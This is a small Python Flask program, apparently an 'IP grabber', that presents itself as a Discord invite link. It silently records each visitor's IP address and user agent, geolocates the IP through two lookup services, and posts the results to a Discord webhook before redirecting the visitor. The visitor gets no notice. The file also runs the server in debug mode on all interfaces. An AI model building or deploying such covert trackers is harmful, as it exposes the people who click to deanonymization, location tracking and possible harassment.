'''
Redirects the user and logs their ip
'''
import os
import requests
from threading import Thread
from dotenv import load_dotenv
from flask import Flask, request, redirect
from services.ip_api import IpApi
from services.db_ip import DBIP

load_dotenv()

app = Flask(__name__)
services = (IpApi, DBIP)
INVITE_LINK = os.environ.get('INVITE_LINK')
WEBHOOK_LINK = os.environ.get('WEBHOOK_LINK')


def post_ip(ip_addr, user_agent):
    '''
    Posts the ip to discord
    '''
    embed = {
        'title': 'Invite IP Log',
        'description': f'Invited to {INVITE_LINK}',
        'fields': [
            {
                'name': 'IP',
                'value': ip_addr
            },
            {
                'name': 'User Agent',
                'value': user_agent
            }
        ]
    }

    for service in services:
        embed['fields'].append(service(ip_addr).lookup_ip())

    try:
        requests.post(WEBHOOK_LINK, json={'embeds': [embed]}, timeout=10)
    except Exception as e:
        print(e)


@app.route('/')
def invite():
    '''
    Logs the visitor's ip, sends it to discord 
    via webhooks and redirects to the invite link
    '''
    if 'HTTP_X_FORWARDED_FOR' in request.environ:
        ip_addr = request.environ['HTTP_X_FORWARDED_FOR']
    elif 'HTTP_X_REAL_IP' in request.environ:
        ip_addr = request.environ['HTTP_X_REAL_IP']
    else:
        ip_addr = request.remote_addr

    Thread(target=post_ip, args=(ip_addr, request.headers.get('User-Agent'))).start()

    return redirect(INVITE_LINK)


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
